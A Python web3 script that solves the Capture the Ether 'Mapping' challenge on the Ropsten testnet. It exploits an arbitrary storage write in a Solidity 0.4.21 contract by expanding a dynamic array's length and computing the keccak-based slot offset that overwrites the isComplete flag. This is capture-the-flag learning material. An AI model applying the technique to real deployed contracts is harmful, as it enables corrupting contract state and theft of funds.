from web3 import Web3
from config import CONFIG
from solcx import compile_source

w3 = Web3(Web3.HTTPProvider(CONFIG["INFURA_URL_ROPSTEN"]))

CHALLENGE_CONTRACT_ADDRESS = "0x877Bf57d55aa9165356D1c97162607e139Bb56f4"

with open('CTE_Contracts/MappingChallenge.sol', 'r') as file:
    challenge_code = file.read()

compiled_challenge_code = compile_source(challenge_code, solc_version="0.4.21")
challenge_contract_id, challenge_contract_interface = compiled_challenge_code.popitem()
challenge_contract_abi = challenge_contract_interface["abi"]
challenge_contract = w3.eth.contract(address=CHALLENGE_CONTRACT_ADDRESS, abi=challenge_contract_abi)

# https://cmichel.io/capture-the-ether-solutions/:
# all of contract storage is a 32 bytes key to 32 bytes value mapping
# expand map to cover all storage, to bypass bounds checking
tx = challenge_contract.functions.set(2**256-2, 0).buildTransaction({
    "nonce": w3.eth.getTransactionCount(CONFIG["ADDRESS_1"]),
    'gas': 3000000,
    'gasPrice': w3.toWei('5', 'gwei')
})
signed_tx = w3.eth.account.signTransaction(tx, private_key=CONFIG["PRIVATE_KEY_1"])
tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)
receipt = w3.eth.waitForTransactionReceipt(tx_hash)

map_data_start_slot = Web3.toInt(Web3.solidityKeccak(["uint256"], [1]))
offset_isComplete_slot = 2**256-map_data_start_slot

tx = challenge_contract.functions.set(offset_isComplete_slot, 1).buildTransaction({
    "nonce": w3.eth.getTransactionCount(CONFIG["ADDRESS_1"]),
    'gas': 3000000,
    'gasPrice': w3.toWei('5', 'gwei')
})
signed_tx = w3.eth.account.signTransaction(tx, private_key=CONFIG["PRIVATE_KEY_1"])
tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)
receipt = w3.eth.waitForTransactionReceipt(tx_hash)

assert challenge_contract.functions.isComplete().call()